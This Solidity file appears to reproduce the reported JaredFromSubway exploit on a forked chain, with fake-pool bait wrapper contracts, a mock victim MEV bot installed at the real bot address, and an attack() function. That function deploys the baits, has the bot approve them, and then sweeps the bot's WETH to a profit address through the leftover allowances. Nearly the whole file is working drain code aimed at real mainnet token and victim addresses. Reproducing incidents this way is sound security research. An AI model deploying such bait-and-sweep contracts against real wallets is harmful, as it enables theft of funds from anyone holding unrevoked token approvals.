// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Faithful MODEL of the JaredFromSubway attack, re-creating the "weeks of fake-pool
// staging" that the raw sweep tx hides. The real staging was OFF-CHAIN and temporal:
// over weeks the attacker deployed ~66 fake tokens / forged Uniswap-v2-style pairs, and
// the victim MEV bot's automated strategy was lured into approving those bait wrappers
// for its real WETH/USDC/USDT — leaving standing (residual) allowances it never revoked.
// A single coordinator call then swept them via transferFrom. The real bot is off-chain-
// driven and unverified, so it cannot be replayed; here it is modeled by a mock bot
// (installed at the real victim address via codeOverride and funded via dealToken) so the
// full lifecycle — STAGE -> LURE -> SWEEP — is reproduced on real WETH.

interface IWETH {
    function approve(address guy, uint256 wad) external returns (bool);
    function transferFrom(address src, address dst, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// A fake-pool bait wrapper. In the real attack ~66 of these were deployed over weeks, each
/// dressed up as a profitable sandwich / multi-hop arb route. `hop()` is the baited "arb"
/// the bot runs (it consumes ~nothing, so the approval is left standing); `pull()` is the
/// sweep leg the coordinator calls later to drain the residual allowance.
contract BaitWrapper {
    event BaitedArb(address bot);

    function hop(address /* weth */) external {
        // Looks like a real route to the bot's strategy; deliberately consumes no allowance.
        emit BaitedArb(msg.sender);
    }

    function pull(address weth, address bot, address to, uint256 amount) external {
        // Residual-allowance drain: the bot still approves this wrapper, so transferFrom works.
        IWETH(weth).transferFrom(bot, to, amount);
    }
}

/// Mock victim MEV bot (jaredfromsubway.eth). Installed at the real victim address via
/// codeOverride. Models the bot's automated strategy: when it sees a bait it approves the
/// wrapper for its WETH and runs the "arb" hop — and never revokes the allowance afterward.
contract MockMEVBot {
    function runBaitedArb(address weth, address bait, uint256 approveAmt) external {
        IWETH(weth).approve(bait, approveAmt); // bot approves the untrusted bait wrapper
        BaitWrapper(bait).hop(weth);           // baited "arb" hop — allowance left standing
    }
}

/// The attacker's staging + coordinator, compressed into one attack():
///   PHASE 1 STAGE  - deploy the fake-pool bait wrappers.
///   PHASE 2 LURE   - the bot's strategy approves each bait (residual allowance remains).
///   PHASE 3 SWEEP  - pull every residual allowance via transferFrom, draining the bot.
contract JaredStagingExploit {
    address public immutable profit;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant BOT = 0x1f2F10D1C40777AE1Da742455c65828FF36Df387; // codeOverride = MockMEVBot
    uint256 constant N = 5; // 5 baits shown here; ~66 in the real weeks-long campaign

    constructor(address profit_) {
        profit = profit_;
    }

    function attack() external {
        uint256 total = IWETH(WETH).balanceOf(BOT); // the bot's real WETH inventory (dealt in setup)

        // PHASE 1 - STAGING: deploy the fake-pool bait wrappers.
        BaitWrapper[] memory baits = new BaitWrapper[](N);
        for (uint256 i = 0; i < N; i++) {
            baits[i] = new BaitWrapper();
        }

        // PHASE 2 - LURE: the bot's strategy approves each bait during its baited "arb".
        // The approval is never revoked, so a residual allowance is left standing.
        for (uint256 i = 0; i < N; i++) {
            MockMEVBot(BOT).runBaitedArb(WETH, address(baits[i]), total);
        }

        // PHASE 3 - SWEEP: the coordinator pulls each residual allowance via transferFrom.
        uint256 share = total / N;
        for (uint256 i = 0; i < N; i++) {
            uint256 amt = i == N - 1 ? IWETH(WETH).balanceOf(BOT) : share;
            baits[i].pull(WETH, BOT, profit, amt);
        }
    }
}
